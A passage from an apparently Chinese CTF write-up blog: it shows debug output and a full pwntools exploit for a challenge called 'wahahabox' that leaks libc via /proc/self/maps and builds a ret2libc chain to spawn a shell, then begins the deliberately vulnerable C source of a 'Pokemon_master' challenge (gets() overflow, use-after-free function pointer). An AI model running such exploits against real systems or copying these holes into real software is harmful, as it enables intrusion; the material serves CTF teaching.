class="number">00215000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30816000<span class="number">-768</span>d3081a000 r--p <span class="number">00215000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d3081a000<span class="number">-768</span>d3081c000 rw-p <span class="number">00219000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d3081c000<span class="number">-768</span>d30829000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309c5000<span class="number">-768</span>d309c8000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309dc000<span class="number">-768</span>d309de000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309de000<span class="number">-768</span>d309e0000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309e0000<span class="number">-768</span>d30a0a000 r-xp <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a0a000<span class="number">-768</span>d30a15000 r--p <span class="number">0002</span>c000 <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a16000<span class="number">-768</span>d30a18000 r--p <span class="number">00037000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a18000<span class="number">-768</span>d30a1a000 rTry to open\n<span class="number">&#x27;</span></span><br><span class="line">/home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/m.py:<span class="number">8</span>: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https:<span class="comment">//docs.pwntools.com/#bytes</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0 \n&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="number">768</span>d309c5000<span class="number">-768</span>d309c8000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">768</span>d309dc000<span class="number">-768</span>d309de000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">768</span>d309de000<span class="number">-768</span>d309e0000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d309e0000<span class="number">-768</span>d30a0a000 r-xp <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a0a000<span class="number">-768</span>d30a15000 r--p <span class="number">0002</span>c000 <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a16000<span class="number">-768</span>d30a18000 r--p <span class="number">00037000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a18000<span class="number">-768</span>d30a1a000 rTry to open</span><br></pre></td></tr></table></figure><p>不同glibc可能内存分布略有区别，这里用的是2.35的3.8</p><p>有了libc地址之后（也可以获得elf地址，stack地址）。就直接栈溢出打system(“&#x2F;bin&#x2F;sh”)就行，如果遇到栈平衡问题，此时请把libc中的system地址+27，这样可以直接调用更底层函数do_system。</p><blockquote><p>当然也有其他getshell方法或者ORW。</p></blockquote><h2 id="TJ4h3">0X2 思路总结</h2><p>scanf的输入，要输入&#x2F;proc&#x2F;self&#x2F;maps去泄露libc地址，然后栈溢出当普通ret2libc来做就可以了。</p><h2 id="vQKCf">0x3 exp</h2><p>getshell发现实在根目录，flag在&#x2F;home&#x2F;ctf目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&#x27;./wahahabox&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,30057)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *$rebase(0x129a)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/proc/self/maps&quot;</span>)#./flag</span><br><span class="line"><span class="meta">#p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0&quot;</span>)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="meta">#p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0 \n&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="type">int</span>(p.recv(<span class="number">12</span>)[<span class="number">-12</span>:].rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">libcbase=libc_addr</span><br><span class="line">system=libcbase+<span class="number">0x50d70</span>+<span class="number">27</span></span><br><span class="line">bin_sh=libcbase+<span class="number">0x1d8678</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="CBjVJ">Pokemon_master</h1><p>:::info<br>宝可梦大师！<br>你是纪南镇的一名宝可梦新手，你已经达到了可以外出探险的年纪，请外出探险，成为伟大的冒险家吧！传闻外面有很强大的神兽，击败它会获得神器。</p><p>TIPS：</p><p>1.商店卖的防御剂有惊喜</p><p>2.负数溢出</p><p>3.选速度最快的精灵</p><p>4.貌似有一个hook？</p><p>5.覆水亦可收，free掉的堆块还能申请回来</p><p>6.申请回特殊堆块可改写hook</p><p>:::</p><p>源码太长了，单独一桌</p><p>基本原理不难，但是逆向难度对于新生来说是有点挑战性的(无论是代码量还是结构体逆向)，花点时间知道原理还是能做出来的，更何况放了那么多tips。</p><p>游戏题：数组溢出、整数溢出比较多</p><h2 id="uivlG">0x0 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXMAX 9999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINMIN 1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> attack;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> speed;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> defence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_choose</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_print</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Mainmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Outmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Skillmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Out</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Store</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Status</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_name</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_print</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Fight</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="keyword">struct</span> pokemon* emerypoke)</span>;</span><br><span class="line"><span class="type">int</span> money=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> change=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *ex1t;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数指针  堆</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">init();</span><br><span class="line">Start_print();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">char</span> say[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>* <span class="title">mypoke</span>;</span></span><br><span class="line">    Start_choose(&amp;mypoke);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You open the Starter Pack and get a hundred coins&quot;</span>);</span><br><span class="line">    money+=<span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>,&amp;<span class="built_in">puts</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">        whilestart:</span><br><span class="line">        <span class="keyword">if</span>(money &lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;No money, you out:(&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">Mainmenu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Store(&amp;mypoke); <span class="comment">//STORE</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:     <span class="comment">//OUT</span></span><br><span class="line">            Out(&amp;mypoke);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:  <span class="comment">//STATUS</span></span><br><span class="line">            Status(&amp;mypoke);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">/* code */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">            gets(say);</span><br><span class="line">            (*(<span class="type">void</span>(*)(<span class="type">char</span>*))ex1t[<span class="number">0</span>])(say);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">666</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Why does technology make Pokémon?&quot;</span>);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>* <span class="title">test</span>;</span></span><br><span class="line">            test=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            read(<span class="number">0</span>,&amp;test-&gt;name[<span class="number">0</span>],<span class="number">0x10</span>);</span><br><span class="line">            test-&gt;hp=<span class="number">1</span>;</span><br><span class="line">            test-&gt;speed=<span class="number">1</span>;</span><br><span class="line">            test-&gt;attack=<span class="number">1</span>;</span><br><span class="line">            test-&gt;defence=<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> whilestart;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//收集数据</span></span><br><span class="line">        <span class="comment">//数据处理</span></span><br><span class="line">        <span class="comment">//绘制图像</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Outmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You walked into the Divine Beast Forest, hoping to meet the Divine Beast QWQ...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are two roads in front of you, choose the one on the left or the one on the right.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.left&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.right&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Out</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    Outmenu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span> *<span class="title">QWQ</span>;</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re very lucky, it&#x27;s the Divine Beast QWQ that roars in front of you, let&#x27;s grab it and knock it out first!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~&quot;</span>);</span><br><span class="line">            QWQ=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            QWQ-&gt;hp=MAXMAX;</span><br><span class="line">            QWQ-&gt;speed=<span class="number">15</span>;</span><br><span class="line">            QWQ-&gt;defence=MAXMAX;</span><br><span class="line">            QWQ-&gt;attack=MAXMAX;</span><br><span class="line">            Pokemon_name(&amp;QWQ,<span class="string">&quot;QWQ&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(Fight(mypoke,QWQ))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The soul of the mythical beast flew away...&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(ex1t);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(QWQ);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span> *<span class="title">TAT</span>;</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t encountered a beast, but you&#x27;ve encountered a TAT that guards the treasure, so try to stun it for some loot&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;TAT: WTF!&quot;</span>);</span><br><span class="line">            TAT=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            TAT-&gt;hp=MINMIN;</span><br><span class="line">            TAT-&gt;speed=<span class="number">15</span>;</span><br><span class="line">            TAT-&gt;defence=MINMIN;</span><br><span class="line">            TAT-&gt;attack=MINMIN;</span><br><span class="line">            Pokemon_name(&amp;TAT,<span class="string">&quot;TAT&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(Fight(mypoke,TAT))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Your earn some money~&quot;</span>);</span><br><span class="line">                money+=<span class="number">200</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(TAT);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Skillmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;When the battle begins, choose the skill you want to use&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack  2.Defence&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Escape  4.Surrender&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Fight</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="keyword">struct</span> pokemon* emerypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> myspeed = (*mypoke)-&gt;speed;</span><br><span class="line">    <span class="type">int</span> emspeed = emerypoke-&gt;speed;</span><br><span class="line">    <span class="type">int</span> myhp=(*mypoke)-&gt;hp;</span><br><span class="line">    <span class="type">int</span> emhp=emerypoke-&gt;hp;</span><br><span class="line">    <span class="type">int</span> faster=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">        Skillmenu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span 